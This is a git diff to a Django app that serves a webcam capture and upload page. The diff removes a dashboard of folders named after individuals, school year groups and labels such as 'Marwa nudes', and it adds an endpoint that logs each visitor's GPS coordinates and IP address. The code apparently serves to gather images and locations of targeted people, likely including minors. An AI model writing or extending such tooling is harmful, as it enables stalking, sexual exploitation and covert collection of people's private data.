@@ -3,10 +3,11 @@ from django.views.decorators.csrf import csrf_exempt
 from django.http import JsonResponse
 from django.core.files.base import ContentFile
 from django.core.files.storage import default_storage
-from .models import Image
+from .models import Image, Location
 import base64
 from datetime import datetime
 import os
+import json
 
 def index(request):
     return render(request, 'pages/camera1.html')  # Renders the page with webcam and upload UI
@@ -42,6 +43,24 @@ def upload_image(request):
     return JsonResponse({'status': 'failed', 'error': 'Invalid request method.'})
 
 
-def dashboard(request):
-    folder_names = "Adam,Yassine,Hassan 3aryan,Hiba,Rihab,Malak,2 EME BAC,1 EME BAC,3 EME COLLEGE,Imane Vape,SALMA,Marwa nudes".split(',')
-    return render(request, 'pages/camera1.html', {'folders': folder_names})
+
+def get_client_ip(request):
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    if x_forwarded_for:
+        ip = x_forwarded_for.split(',')[0]  # first IP in list
+    else:
+        ip = request.META.get('REMOTE_ADDR')
+    return ip
+
+@csrf_exempt
+def save_location(request):
+    if request.method == 'POST':
+        data = json.loads(request.body)
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
+        ip_address = get_client_ip(request)
+
+        print(f"User IP: {ip_address}, Location: {latitude}, {longitude}")
+        # You can save it to your DB here
+        save_location = Location.objects.create(latitude=latitude, longitude=longitude, ip_address=ip_address)
+        return JsonResponse({'status': 'success'})
